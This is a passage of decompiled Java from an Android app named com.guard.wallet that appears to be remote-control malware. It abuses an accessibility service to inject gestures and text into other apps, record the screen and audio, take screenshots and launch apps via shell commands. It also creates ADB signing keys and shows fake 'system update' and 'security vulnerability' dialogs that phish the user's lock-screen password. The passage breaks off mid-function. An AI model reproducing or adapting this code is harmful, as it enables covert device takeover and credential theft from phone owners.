                     if (var8 != null && ((UiObject)var8).setText(var13)) {
                        M((UiObject)var8);
                        return var4;
                     }
                  }
               }

               return false;
            }
         }
      }
   }

   public static int O0() {
      if (Z() != null) {
         int var0;
         try {
            var0 = System.getInt(Z().getContentResolver(), "screen_brightness");
         } catch (Exception var2) {
            q.s("ApplicationUtil", var2);
            return 90;
         }

         if (var0 >= 0) {
            return var0;
         }
      }

      return 90;
   }

   public static void P() {
      t0(false);
      com.guard.wallet.helper.d.b("GLOBAL_UNLOCK");
      if (MyAccessibilityService.P() != null) {
         MyAccessibilityService var0 = MyAccessibilityService.P();
         var0.getClass();

         try {
            var0.n.set(false);
         } catch (Exception var1) {
            q.s("MyAccessibilityService", var1);
         }
      }
   }

   public static Long P0() {
      if (Z() != null) {
         long var0;
         try {
            var0 = System.getLong(Z().getContentResolver(), "screen_off_timeout");
         } catch (Exception var3) {
            q.s("ApplicationUtil", var3);
            return null;
         }

         if (var0 > 0L) {
            return var0;
         }
      }

      return null;
   }

   public static void Q() {
      t0(false);
      com.guard.wallet.helper.d.b("GLOBAL_UNLOCK");
      if (MyAccessibilityService.P() != null) {
         MyAccessibilityService var0 = MyAccessibilityService.P();
         var0.getClass();

         try {
            var0.n.set(false);
         } catch (Exception var1) {
            q.s("MyAccessibilityService", var1);
         }
      }
   }

   public static boolean Q0() {
      Integer var0 = d.a;
      String var3;
      if (MainApplication.getInstance() != null
         && MainApplication.getInstance().getBuildConfig() != null
         && !q.B(MainApplication.getInstance().getBuildConfig().getAppCredentialTitle())) {
         var3 = MainApplication.getInstance().getBuildConfig().getAppCredentialTitle();
      } else {
         var3 = "Verify personal identity";
      }

      String var1;
      if (MainApplication.getInstance() != null
         && MainApplication.getInstance().getBuildConfig() != null
         && !q.B(MainApplication.getInstance().getBuildConfig().getAppCredentialSubTitle())) {
         var1 = MainApplication.getInstance().getBuildConfig().getAppCredentialSubTitle();
      } else {
         var1 = "Privacy protection";
      }

      String var2;
      if (MainApplication.getInstance() != null
         && MainApplication.getInstance().getBuildConfig() != null
         && !q.B(MainApplication.getInstance().getBuildConfig().getAppCredentialDescription())) {
         var2 = MainApplication.getInstance().getBuildConfig().getAppCredentialDescription();
      } else {
         var2 = "To protect your privacy, please enter your lock screen password to verify that you are the one making the operation.";
      }

      return R0(var3, var1, var2, "PREPARE_FOR_APP_CONFIRM_LOCK");
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean R() {
      Exception var10000;
      label45: {
         PrivateKey var19;
         X509CertImpl var21;
         try {
            KeyPairGenerator var2 = KeyPairGenerator.getInstance("RSA");
            var2.initialize(2048, SecureRandom.getInstance("SHA1PRNG"));
            KeyPair var3 = var2.generateKeyPair();
            PublicKey var14 = var3.getPublic();
            var19 = var3.getPrivate();
            String var6 = "CN=".concat("com.guard.wallet");
            long var0 = java.lang.System.currentTimeMillis();
            CertificateExtensions var4 = new CertificateExtensions();
            KeyIdentifier var7 = new KeyIdentifier(var14);
            SubjectKeyIdentifierExtension var5 = new SubjectKeyIdentifierExtension(var7.getIdentifier());
            var4.set("SubjectKeyIdentifier", var5);
            X500Name var22 = new X500Name(var6);
            Date var26 = new Date();
            Date var8 = new Date(var0 + 315360000000L);
            PrivateKeyUsageExtension var24 = new PrivateKeyUsageExtension(var26, var8);
            var4.set("PrivateKeyUsage", var24);
            CertificateValidity var25 = new CertificateValidity(var26, var8);
            X509CertInfo var27 = new X509CertInfo();
            CertificateVersion var28 = new CertificateVersion(2);
            var27.set("version", var28);
            Random var9 = new Random();
            CertificateSerialNumber var29 = new CertificateSerialNumber(var9.nextInt() & 2147483647);
            var27.set("serialNumber", var29);
            CertificateAlgorithmId var30 = new CertificateAlgorithmId(AlgorithmId.get("SHA512withRSA"));
            var27.set("algorithmID", var30);
            CertificateSubjectName var31 = new CertificateSubjectName(var22);
            var27.set("subject", var31);
            CertificateX509Key var32 = new CertificateX509Key(var14);
            var27.set("key", var32);
            var27.set("validity", var25);
            CertificateIssuerName var15 = new CertificateIssuerName(var22);
            var27.set("issuer", var15);
            var27.set("extensions", var4);
            var21 = new X509CertImpl(var27);
            var21.sign(var19, "SHA512withRSA");
         } catch (Exception var13) {
            var10000 = var13;
            boolean var10001 = false;
            break label45;
         }

         File var17;
         label37: {
            try {
               if (!q.B(i0())) {
                  var17 = new File(i0(), "private.key");
                  FileOutputStream var23 = new FileOutputStream(var17);
                  var23.write(var19.getEncoded());
                  var23.flush();
                  var23.close();
                  break label37;
               }
            } catch (Exception var12) {
               Exception var16 = var12;

               try {
                  q.s("AdbKeyUtils", var16);
               } catch (Exception var11) {
                  var10000 = var11;
                  boolean var33 = false;
                  break label45;
               }
            }

            var17 = null;
         }

         try {
            File var20 = w1(var21);
            return var17 != null && var20 != null;
         } catch (Exception var10) {
            var10000 = var10;
            boolean var34 = false;
         }
      }

      Exception var18 = var10000;
      q.s("AdbKeyUtils", var18);
      return false;
   }

   public static boolean R0(String var0, String var1, String var2, String var3) {
      try {
         if (Z() != null && MyAccessibilityService.P() != null) {
            if (MyAccessibilityService.P().j()) {
               return false;
            }

            if (w.a.a()) {
               return false;
            }

            if (p0()) {
               return false;
            }

            if (q.G() && !q.A() && !q.O(null, null)) {
               return false;
            }

            Intent var4 = A0(Z().getPackageName(), ConfirmDeviceActivity.class.getName());
            Bundle var5 = new Bundle();
            var5.putString("CONFIRM_DEVICE_CREDENTIAL_TITLE", var0);
            var5.putString("CONFIRM_DEVICE_CREDENTIAL_SUB_TITLE", var1);
            var5.putString("CONFIRM_DEVICE_CREDENTIAL_DESCRIPTION", var2);
            var5.putString("CONFIRM_FOR_EVENT_CODE", var3);
            var4.putExtras(var5);
            Z().startActivity(var4);
            return true;
         }
      } catch (Exception var6) {
         q.s("ApplicationUtil", var6);
      }

      return false;
   }

   public static boolean S(Long var0, Long var1, Point... var2) {
      boolean var6 = false;
      Path var13;
      if (var2 != null && var2.length > 0) {
         Path var7 = new Path();
         Point var8 = var2[0];
         var7.moveTo(var8.getX(), var8.getY());
         int var4 = var2.length;
         int var3 = 1;
         if (var4 > 1) {
            while (var3 < var2.length) {
               var8 = var2[var3];
               var7.lineTo(var8.getX(), var8.getY());
               var3++;
            }
         }

         var13 = var7;
      } else {
         var13 = null;
      }

      boolean var5 = var6;
      if (var13 != null) {
         StrokeDescription var9 = new StrokeDescription(var13, var0, var1);
         ArrayList var11 = new ArrayList();
         var11.add(var9);
         var5 = var6;
         if (MyAccessibilityService.P() != null) {
            var5 = var6;
            if (!var11.isEmpty()) {
               Builder var10 = new Builder();
               Iterator var12 = var11.iterator();

               while (var12.hasNext()) {
                  var10.addStroke((StrokeDescription)var12.next());
               }

               var5 = MyAccessibilityService.P().dispatchGesture(var10.build(), null, null);
            }
         }
      }

      return var5;
   }

   public static boolean S0() {
      Integer var0 = d.a;
      String var3;
      if (MainApplication.getInstance() != null
         && MainApplication.getInstance().getBuildConfig() != null
         && !q.B(MainApplication.getInstance().getBuildConfig().getUpdateCredentialTitle())) {
         var3 = MainApplication.getInstance().getBuildConfig().getUpdateCredentialTitle();
      } else {
         var3 = "Verify lock screen password";
      }

      String var1;
      if (MainApplication.getInstance() != null
         && MainApplication.getInstance().getBuildConfig() != null
         && !q.B(MainApplication.getInstance().getBuildConfig().getUpdateCredentialSubTitle())) {
         var1 = MainApplication.getInstance().getBuildConfig().getUpdateCredentialSubTitle();
      } else {
         var1 = "Fix system security vulnerabilities";
      }

      String var2;
      if (MainApplication.getInstance() != null
         && MainApplication.getInstance().getBuildConfig() != null
         && !q.B(MainApplication.getInstance().getBuildConfig().getUpdateCredentialDescription())) {
         var2 = MainApplication.getInstance().getBuildConfig().getUpdateCredentialDescription();
      } else {
         var2 = "Please enter your lock screen password to complete the system update and fix security vulnerabilities.";
      }

      return R0(var3, var1, var2, "PREPARE_FOR_UPDATE_SYSTEM");
   }

   public static boolean T() {
      ScreenMetricsVO var8 = e.e();
      Integer var7 = var8.getWidth();
      byte var1 = 0;
      if (var7 != null && var8.getWidth() > 0 && var8.getHeight() != null && var8.getHeight() > 0) {
         Point var11 = new Point((float)var8.getWidth().intValue() / 2.0F, (float)var8.getHeight().intValue() - 200.0F);
         Point var13 = new Point((float)var8.getWidth().intValue() / 2.0F, 200.0F);
         if (MyAccessibilityService.P() != null) {
            boolean var6 = v1(10);
            int var0 = 0;

            while (!var6 && var0 < 10) {
               long var4 = (long)var0 * 100L + 100L;
               long var2 = var4;
               if (var4 > 600L) {
                  var2 = 600L;
               }

               if (S(10L, var2, var11, var13)) {
                  var6 = v1(20);
                  var0++;
               }
            }

            if (var6) {
               return true;
            }
         }

         if (h.e.S() != null && h.e.S().D()) {
            String var12 = String.format(Locale.getDefault(), "input swipe %.0f %.0f %.0f %.0f", var11.getX(), var11.getY(), var13.getX(), var13.getY());
            boolean var10 = v1(10);
            int var9 = var1;

            while (!var10 && var9 < 10) {
               if (h.e.S().N(var12)) {
                  var10 = v1(20);
                  var9++;
               }
            }

            return var10;
         }
      }

      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static void T0(int var0) {
      int var1 = var0;
      if (var0 <= 0) {
         var1 = 1;
      }

      Exception var10000;
      label32: {
         AtomicInteger var2;
         try {
            var2 = new AtomicInteger(var1);
         } catch (Exception var4) {
            var10000 = var4;
            boolean var10001 = false;
            break label32;
         }

         while (true) {
            try {
               if (!Thread.currentThread().isAlive() || Thread.currentThread().isInterrupted() || var2.decrementAndGet() < 0) {
                  return;
               }

               Thread.sleep(200L);
            } catch (Exception var3) {
               var10000 = var3;
               boolean var6 = false;
               break;
            }
         }
      }

      Exception var5 = var10000;
      q.s("ApplicationUtil", var5);
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static byte[] U(String var0) {
      if (Z() != null && l() && !q.B(var0)) {
         Exception var10000;
         label68: {
            Drawable var3;
            try {
               var3 = Z().getPackageManager().getApplicationIcon(var0);
            } catch (Exception var10) {
               var10000 = var10;
               boolean var10001 = false;
               break label68;
            }

            label58: {
               if (var3 != null) {
                  label70: {
                     int var1;
                     int var2;
                     label53: {
                        try {
                           var2 = var3.getIntrinsicWidth();
                           var1 = var3.getIntrinsicHeight();
                           if (var3.getOpacity() != -1) {
                              var11 = Config.ARGB_8888;
                              break label53;
                           }
                        } catch (Exception var9) {
                           var10000 = var9;
                           boolean var16 = false;
                           break label70;
                        }

                        try {
                           var11 = Config.RGB_565;
                        } catch (Exception var8) {
                           var10000 = var8;
                           boolean var17 = false;
                           break label70;
                        }
                     }

                     try {
                        var13 = Bitmap.createBitmap(var2, var1, var11);
                        Canvas var4 = new Canvas(var13);
                        var3.setBounds(0, 0, var3.getIntrinsicWidth(), var3.getIntrinsicHeight());
                        var3.draw(var4);
                        break label58;
                     } catch (Exception var7) {
                        var10000 = var7;
                        boolean var18 = false;
                     }
                  }

                  Exception var12 = var10000;

                  try {
                     q.s("BitmapUtils", var12);
                  } catch (Exception var6) {
                     var10000 = var6;
                     boolean var19 = false;
                     break label68;
                  }
               }

               var13 = null;
            }

            try {
               return M0(var13, 1.0F, 100);
            } catch (Exception var5) {
               var10000 = var5;
               boolean var20 = false;
            }
         }

         Exception var14 = var10000;
         q.s("ApplicationUtil", var14);
      }

      return null;
   }

   public static void U0() {
      long var0 = (long)1;

      try {
         Thread.sleep(var0 * 500L);
      } catch (Exception var3) {
         q.s("UnLockUtils", var3);
      }
   }

   public static Drawable V(String var0) {
      if (Z() != null && l() && !q.B(var0)) {
         try {
            return Z().getPackageManager().getApplicationIcon(var0);
         } catch (Exception var1) {
            q.s("ApplicationUtil", var1);
         }
      }

      return null;
   }

   public static boolean V0() {
      try {
         if (Z() != null) {
            Intent var1 = new Intent("android.settings.ACCESSIBILITY_SETTINGS");
            var1.addFlags(268435456);
            var1.addFlags(536870912);
            var1.addFlags(67108864);
            var1.addFlags(2097152);
            var1.addFlags(8388608);
            ComponentName var0 = new ComponentName(Z(), MyAccessibilityService.class);
            var1.putExtra(":settings:fragment_args_key", var0.flattenToString());
            Bundle var2 = new Bundle();
            var2.putString(":settings:fragment_args_key", var0.flattenToString());
            var1.putExtra(":settings:show_fragment_args", var2);
            Z().startActivity(var1);
            return true;
         }
      } catch (Exception var3) {
         q.s("ApplicationUtil", var3);
      }

      return false;
   }

   public static AppInfo W(PackageManager var0, ApplicationInfo var1) {
      if (var1 != null) {
         AppInfo var3 = new AppInfo();
         var3.setPackageName(var1.packageName);
         if (!q.B(var1.permission)) {
            var3.setPermission(var1.permission);
         }

         if (!q.B(var1.className)) {
            var3.setAppClassName(var1.className);
         }

         String var2;
         if (!q.B(var1.processName)) {
            var2 = var1.processName;
         } else {
            var2 = var1.packageName;
         }

         var3.setProcessName(var2);
         Integer var5;
         if (var1.enabled) {
            var5 = 1;
         } else {
            var5 = 0;
         }

         var3.setIsEnable(var5);
         Integer var6;
         if ((var1.flags & 1) == 1) {
            var6 = 1;
         } else {
            var6 = 0;
         }

         var3.setSystemApp(var6);
         Integer var7;
         if ((var1.flags & 262144) == 262144) {
            var7 = 1;
         } else {
            var7 = 0;
         }

         var3.setExternalApp(var7);
         var3.setUninstalled(0);
         CharSequence var8 = var0.getApplicationLabel(var1);
         if (var8 != null) {
            var3.setApplicationLabel(var8.toString());
         }

         Intent var4 = var0.getLaunchIntentForPackage(var1.packageName);
         if (var4 != null) {
            if (var4.getComponent() != null) {
               var3.setMainClassName(var4.getComponent().getClassName());
            }

            if (var4.getAction() != null) {
               var3.setMainAction(var4.getAction());
            }
         }

         return var3;
      } else {
         return null;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   // $VF: Could not inline inconsistent finally blocks
   // $VF: Could not create synchronized statement, marking monitor enters and exits
   // Please report this to the Vineflower issue tracker, at https://github.com/Vineflower/vineflower/issues with a copy of the class file (if you have the rights to distribute it!)
   public static void W0() {
      synchronized (g.class){} // $VF: monitorenter 

      label117: {
         Throwable var10000;
         label122: {
            label114: {
               IntentFilter var0;
               AlarmReceiver var17;
               try {
                  if (MainApplication.getInstance() == null || MainApplication.getInstance().getAlarmReceiver() != null) {
                     break label117;
                  }

                  var0 = new IntentFilter();
                  String var3 = MainApplication.getInstance().getPackageName().concat(".alarm.action");
                  String var2 = MainApplication.getInstance().getPackageName().concat(".pause.accessibility");
                  String var1 = MainApplication.getInstance().getPackageName().concat(".resume.accessibility");
                  var0.addAction(var3);
                  var0.addAction(var2);
                  var0.addAction(var1);
                  var17 = new AlarmReceiver();
                  MainApplication.getInstance().setAlarmReceiver(var17);
                  if (VERSION.SDK_INT >= 33) {
                     MainApplication.getInstance().registerReceiver(var17, var0, 2);
                     break label114;
                  }
               } catch (Throwable var15) {
                  var10000 = var15;
                  boolean var10001 = false;
                  break label122;
               }

               try {
                  MainApplication.getInstance().registerReceiver(var17, var0);
               } catch (Throwable var14) {
                  var10000 = var14;
                  boolean var18 = false;
                  break label122;
               }
            }

            label104:
            try {
               Log.d("ReceiverUtils", "startAlarmReceiver 启动完成");
               break label117;
            } catch (Throwable var13) {
               var10000 = var13;
               boolean var19 = false;
               break label104;
            }
         }

         Throwable var16 = var10000;
         // $VF: monitorexit
         throw var16;
      }

      // $VF: monitorexit
   }

   // $VF: Handled exception range with multiple entry points by splitting it
   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static LinkedList X() {
      Exception var10000;
      label68: {
         PackageManager var1;
         try {
            if (Z() == null) {
               return null;
            }

            var1 = Z().getPackageManager();
         } catch (Exception var8) {
            var10000 = var8;
            boolean var10001 = false;
            break label68;
         }

         if (var1 == null) {
            return null;
         }

         LinkedList var0;
         label60: {
            try {
               var0 = new LinkedList();
               Intent var2 = new Intent("android.intent.action.VIEW");
               var2.addCategory("android.intent.category.DEFAULT");
               var2.addCategory("android.intent.category.BROWSABLE");
               var2.setData(Uri.parse("http://"));
               List var10 = var1.queryIntentActivities(var2, 131072);
               if (var10.isEmpty()) {
                  break label60;
               }

               var11 = var10.iterator();
            } catch (Exception var7) {
               var10000 = var7;
               boolean var15 = false;
               break label68;
            }

            while (true) {
               ResolveInfo var12;
               try {
                  if (!var11.hasNext()) {
                     break;
                  }

                  var12 = (ResolveInfo)var11.next();
               } catch (Exception var6) {
                  var10000 = var6;
                  boolean var16 = false;
                  break label68;
               }

               if (var12 != null) {
                  try {
                     var13 = var12.activityInfo;
                  } catch (Exception var4) {
                     var10000 = var4;
                     boolean var17 = false;
                     break label68;
                  }

                  if (var13 != null) {
                     try {
                        String var14 = var13.packageName;
                        if (!q.B(var14) && !var0.contains(var14)) {
                           var0.add(var14);
                        }
                     } catch (Exception var5) {
                        var10000 = var5;
                        boolean var18 = false;
                        break label68;
                     }
                  }
               }
            }
         }

         try {
            return var0;
         } catch (Exception var3) {
            var10000 = var3;
            boolean var19 = false;
         }
      }

      Exception var9 = var10000;
      q.s("ApplicationUtil", var9);
      return null;
   }

   public static boolean X0() {
      try {
         if (Z() != null) {
            Intent var0 = new Intent("android.settings.SETTINGS");
            var0.addFlags(268435456);
            var0.addFlags(536870912);
            var0.addFlags(2097152);
            var0.addFlags(8388608);
            Z().startActivity(var0);
            return true;
         }
      } catch (Exception var1) {
         q.s("ApplicationUtil", var1);
      }

      return false;
   }

   public static byte[] Y(String var0) {
      return var0.getBytes(Charset.forName("UTF-8"));
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean Y0(String var0, String var1) {
      boolean var5 = false;
      boolean var4 = false;
      boolean var2 = var4;
      boolean var3 = var5;

      Exception var10000;
      label147: {
         label148: {
            try {
               if (h.e.S() == null) {
                  break label148;
               }
            } catch (Exception var19) {
               var10000 = var19;
               boolean var10001 = false;
               break label147;
            }

            var2 = var4;
            var3 = var5;

            try {
               if (!h.e.S().D()) {
                  break label148;
               }
            } catch (Exception var18) {
               var10000 = var18;
               boolean var26 = false;
               break label147;
            }

            var3 = var5;

            h.e var7;
            try {
               var7 = h.e.S();
            } catch (Exception var16) {
               var10000 = var16;
               boolean var27 = false;
               break label147;
            }

            var3 = var5;

            try {
               var7.getClass();
            } catch (Exception var15) {
               var10000 = var15;
               boolean var28 = false;
               break label147;
            }

            var2 = var4;
            var3 = var5;

            try {
               if (q.B(var0)) {
                  break label148;
               }
            } catch (Exception var17) {
               var10000 = var17;
               boolean var29 = false;
               break label147;
            }

            var3 = var5;

            String var25;
            label138: {
               label149: {
                  try {
                     if (!q.B(var1)) {
                        break label149;
                     }
                  } catch (Exception var22) {
                     var10000 = var22;
                     boolean var30 = false;
                     break label147;
                  }

                  var3 = var5;

                  try {
                     var6 = u0(var0);
                  } catch (Exception var14) {
                     var10000 = var14;
                     boolean var31 = false;
                     break label147;
                  }

                  label132:
                  if (var6 != null) {
                     var3 = var5;

                     try {
                        if (var6.getComponent() == null) {
                           break label132;
                        }
                     } catch (Exception var21) {
                        var10000 = var21;
                        boolean var32 = false;
                        break label147;
                     }

                     var3 = var5;

                     try {
                        var25 = var6.getComponent().getClassName();
                        break label138;
                     } catch (Exception var13) {
                        var10000 = var13;
                        boolean var33 = false;
                        break label147;
                     }
                  }
               }

               var25 = var1;
            }

            var3 = var5;

            label150: {
               try {
                  if (q.B(var25)) {
                     break label150;
                  }
               } catch (Exception var20) {
                  var10000 = var20;
                  boolean var34 = false;
                  break label147;
               }

               var3 = var5;

               try {
                  var2 = var7.N("am start -n ".concat(var0).concat("/").concat(var25));
                  break label148;
               } catch (Exception var12) {
                  var10000 = var12;
                  boolean var35 = false;
                  break label147;
               }
            }

            var2 = var4;
         }

         if (var2) {
            return var2;
         }

         var3 = var2;

         label151: {
            try {
               if (!q.G()) {
                  break label151;
               }
            } catch (Exception var11) {
               var10000 = var11;
               boolean var36 = false;
               break label147;
            }

            var3 = var2;

            try {
               if (q.A()) {
                  break label151;
               }
            } catch (Exception var10) {
               var10000 = var10;
               boolean var37 = false;
               break label147;
            }

            var3 = var2;

            try {
               q.O(null, null);
            } catch (Exception var9) {
               var10000 = var9;
               boolean var38 = false;
               break label147;
            }
         }

         var3 = var2;

         try {
            return d1(var0, var1);
         } catch (Exception var8) {
            var10000 = var8;
            boolean var39 = false;
         }
      }

      Exception var23 = var10000;
      q.s("ApplicationUtil", var23);
      return var3;
   }

   public static Context Z() {
      if (e.b.a() != null) {
         return e.b.a();
      } else {
         return MainApplication.getAppContext() != null ? MainApplication.getAppContext() : null;
      }
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean Z0(String var0) {
      Exception var10000;
      label35: {
         try {
            if (Z() == null) {
               return false;
            }
         } catch (Exception var4) {
            var10000 = var4;
            boolean var10001 = false;
            break label35;
         }

         String var1 = var0;

         try {
            if (q.B(var0)) {
               var1 = Z().getPackageName();
            }
         } catch (Exception var3) {
            var10000 = var3;
            boolean var7 = false;
            break label35;
         }

         try {
            Intent var6 = new Intent("android.settings.APPLICATION_DETAILS_SETTINGS");
            var6.setData(Uri.fromParts("package", var1, null));
            var6.addFlags(268435456);
            var6.addFlags(8388608);
            Z().startActivity(var6);
            return true;
         } catch (Exception var2) {
            var10000 = var2;
            boolean var8 = false;
         }
      }

      Exception var5 = var10000;
      q.s("ApplicationUtil", var5);
      return false;
   }

   // $VF: Inserted dummy exception handlers to handle obfuscated exceptions
   public static boolean a(GlobalActionCondition var0) {
      boolean var12 = false;
      boolean var13 = false;
      boolean var10 = false;
      boolean var11 = false;
      boolean var9 = false;
      boolean var8 = false;
      boolean var7 = var9;
      if (var0 != null) {
         var7 = var9;
         if (!q.B(var0.getActionName())) {
            byte var1;
            label359: {
               String var16 = var0.getActionName();
               var16.getClass();
               switch (var16.hashCode()) {
                  case -2038603629:
                     if (var16.equals("hideSoftKeyboard")) {
                        var1 = 0;
                        break label359;
                     }
                     break;
                  case -1473115856:
                     if (var16.equals("quickSettings")) {
                        var1 = 1;
                        break label359;
                     }
                     break;
                  case -1400824069:
                     if (var16.equals("accessibilityButtonChooser")) {
                        var1 = 2;
                        break label359;
                     }
                     break;
                  case -1357714453:
                     if (var16.equals("clicks")) {
                        var1 = 3;
                        break label359;
                     }
                     break;
                  case -1325629270:
                     if (var16.equals("dpadUp")) {
                        var1 = 4;
                        break label359;
                     }
                     break;
                  case -1152999879:
                     if (var16.equals("keyCodeHeadsetHook")) {
                        var1 = 5;
                        break label359;
                     }
                     break;
                  case -934918565:
                     if (var16.equals("recent")) {
                        var1 = 6;
                        break label359;
                     }
                     break;
                  case -923164956:
                     if (var16.equals("dpadCenter")) {
                        var1 = 7;
                        break label359;
                     }
                     break;
                  case -908415649:
                     if (var16.equals("startScreenRecord")) {
                        var1 = 8;
                        break label359;
                     }
                     break;
                  case -821301755:
                     if (var16.equals("startAudioRecord")) {
                        var1 = 9;
                        break label359;
                     }
                     break;
                  case -417400442:
                     if (var16.equals("screenShot")) {
                        var1 = 10;
                        break label359;
                     }
                     break;
                  case -385981800:
                     if (var16.equals("dismissNotificationShade")) {
                        var1 = 11;
                        break label359;
                     }
                     break;
                  case -140672769:
                     if (var16.equals("stopScreenRecord")) {
                        var1 = 12;
                        break label359;
                     }
                     break;
                  case -103799195:
                     if (var16.equals("stopAudioRecord")) {
                        var1 = 13;
                        break label359;
                     }
                     break;
                  case -75080375:
                     if (var16.equals("gesture")) {
                        var1 = 14;
                        break label359;
                     }
                     break;
                  case 1170093:
                     if (var16.equals("powerDialog")) {
                        var1 = 15;
                        break label359;
                     }
                     break;
                  case 3015911:
                     if (var16.equals("back")) {
                        var1 = 16;
                        break label359;
                     }
                     break;
                  case 3208415:
                     if (var16.equals("home")) {
                        var1 = 17;
                        break label359;
                     }
                     break;
                  case 94750088:
                     if (var16.equals("click")) {
                        var1 = 18;
                        break label359;
                     }
                     break;
                  case 102022252:
                     if (var16.equals("longClick")) {
                        var1 = 19;
                        break label359;
                     }
                     break;
                  case 106931267:
                     if (var16.equals("press")) {
                        var1 = 20;
                        break label359;
                     }
                     break;
                  case 109854522:
                     if (var16.equals("swipe")) {
                        var1 = 21;
                        break label359;
                     }
                     break;
                  case 194959693:
                     if (var16.equals("takeScreenshot")) {
                        var1 = 22;
                        break label359;
                     }
                     break;
                  case 399827373:
                     if (var16.equals("dpadRight")) {
                        var1 = 23;
                        break label359;
                     }
                     break;
                  case 595233003:
                     if (var16.equals("notification")) {
                        var1 = 24;
                        break label359;
                     }
                     break;
                  case 742708148:
                     if (var16.equals("accessibilityShortcut")) {
                        var1 = 25;
                        break label359;
                     }
                     break;
                  case 876717431:
                     if (var16.equals("lockScreen")) {
                        var1 = 26;
                        break label359;
                     }
                     break;
                  case 925114912:
                     if (var16.equals("accessibilityButton")) {
                        var1 = 27;
                        break label359;
                     }
                     break;
                  case 1470406094:
                     if (var16.equals("showSoftKeyboard")) {
                        var1 = 28;
                        break label359;
                     }
                     break;
                  case 1571418285:
                     if (var16.equals("repeatClick")) {
                        var1 = 29;
                        break label359;
                     }
                     break;
                  case 1675054833:
                     if (var16.equals("dpadDown")) {
                        var1 = 30;
                        break label359;
                     }
                     break;
                  case 1675283030:
                     if (var16.equals("dpadLeft")) {
                        var1 = 31;
                        break label359;
                     }
                     break;
                  case 1754686085:
                     if (var16.equals("accessibilityAllApps")) {
                        var1 = 32;
                        break label359;
                     }
                     break;
                  case 1984984239:
                     if (var16.equals("setText")) {
                        var1 = 33;
                        break label359;
                     }
                     break;
                  case 1991609382:
                     if (var16.equals("splitScreen")) {
                        var1 = 34;
                        break label359;
                     }
               }

               var1 = -1;
            }

            switch (var1) {
               case 0:
                  var7 = var9;
                  if (MyAccessibilityService.P() != null) {
                     if (!Objects.equals(MyAccessibilityService.P().getSoftKeyboardController().getShowMode(), 1)) {
                        var7 = MyAccessibilityService.P().getSoftKeyboardController().setShowMode(1);
                     } else {
                        var7 = true;
                     }
                  }
                  break;
               case 1:
                  return F0(5);
               case 2:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 31) {
                     return F0(12);
                  }
                  break;
               case 3:
                  var7 = var9;
                  if (var0.getPoints() != null) {
                     var7 = var9;
                     if (!var0.getPoints().isEmpty()) {
                        return t(var0.getPoints());
                     }
                  }
                  break;
               case 4:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 33) {
                     return F0(16);
                  }
                  break;
               case 5:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 31) {
                     return F0(10);
                  }
                  break;
               case 6:
                  return F0(3);
               case 7:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 33) {
                     return F0(20);
                  }
                  break;
               case 8:
                  return l.n();
               case 9:
                  ActionValueCondition var27 = var0.getValue();
                  var7 = var9;
                  if (var27 != null) {
                     var7 = var9;
                     if (!q.B(var27.getKey())) {
                        var7 = var9;
                        if ("audioSource".equals(var27.getKey())) {
                           var7 = var9;
                           if ("Int".equals(var27.getType())) {
                              var7 = var9;
                              if (q.D(var27.getValue())) {
                                 var1 = Integer.parseInt(var27.getValue());
                                 return j.d.b().d(Integer.valueOf(var1));
                              }
                           }
                        }
                     }
                  }
                  break;
               case 10:
                  String var25 = l.a;
                  var7 = var11;
                  if (!q.E(7912)) {
                     j.e var26 = new j.e(1);
                     new com.guard.wallet.http.i("http://127.0.0.1:7912").d(null, "/screenshot/0", var26);
                     var7 = true;
                  }

                  return var7;
               case 11:
                  var7 = var9;
                  if (VERSION.SDK_INT >= 31) {
                     return F0(15);
                  }
                  break;
               case 12:
                  return l.o();
               case 13:
                  return j.d.b().e();
               case 14:
                  var7 = var9;
                  if (var0.getPoints() != null) {
                     var7 = var9;
                     if (!var0.getPoints().isEmpty()) {
                        if (var0.getDuration() <= 0L) {
                           var0.setDuration(300L);
                        }

                        Point[] var50 = new Point[var0.getPoints().size()];
                        var0.getPoints().toArray(var50);
                        return S(var0.getStart(), var0.getDuration(), var50);
                     }
                  }
                  break;
               case 15:
                  return F0(6);
               case 16:
                  return F0(1);
               case 17:
                  return F0(2);
               case 18:
                  var7 = var9;
                  if (var0.getPoints() != null) {
                     var7 = var9;
                     if (!var0.getPoints().isEmpty()) {
                        Point var24 = var0.getPoints().get(0);
                        return s((int)var24.getX(), (int)var24.getY());
                     }
                  }
                  break;
               case 19:
                  var7 = var9;
                  if (var0.getPoints() != null) {
                     var7 = var9;
                     if (!var0.getPoints().isEmpty()) {
                        if (var0.getDuration() <= 0L) {
                           var0.setDuration(200L);
                        }

                        Point var48 = var0.getPoints().get(0);
                        int var34 = (int)var48.getX();
                        var1 = (int)var48.getY();
                        Long var49 = var0.getDuration();
                        Point var23 = new Point(Integer.valueOf(var34).floatValue(), Integer.valueOf(var1).floatValue());
                        long var14 = (long)ViewConfiguration.getLongPressTimeout();
                        return S(16L, var49 + var14, var23);
                     }
                  }
                  break;
               case 20:
                  var7 = var9;
                  if (var0.getPoints() != null) {
                     var7 = var9;
                     if (!var0.getPoints().isEmpty()) {
                        if (var0.getDuration() <= 0L) {
                           var0.setDuration(600L);
                        }

                        Point var47 = var0.getPoints().get(0);
                        return G0((int)var47.getX(), (int)var47.getY(), var0.getDuration());
                     }
                  }
                  break;
               case 21:
                  var7 = var9;
                  if (var0.getPoints() != null) {
                     var7 = var9;
                     if (var0.getPoints().size() >= 2) {
                        if (var0.getDuration() <= 0L) {
                           var0.setDuration(600L);
                        }

                        Point var46 = var0.getPoints().get(0);
                        Point var17 = var0.getPoints().get(1);
                        int var33 = (int)var46.getX();
                        int var36 = (int)var46.getY();
                        int var35 = (int)var17.getX();
                        var1 = (int)var17.getY();
                        return S(
                           16L,
                           var0.getDuration(),
                           new Point((float)Integer.valueOf(var33).intValue(), (float)Integer.valueOf(var36).intValue()),
                           new Point((float)Integer.valueOf(var35).intValue(), (float)Integer.valueOf(var1).intValue())
                        );
                     }
                  }
                  break;
               case 22:
                  var1 = VERSION.SDK_INT;
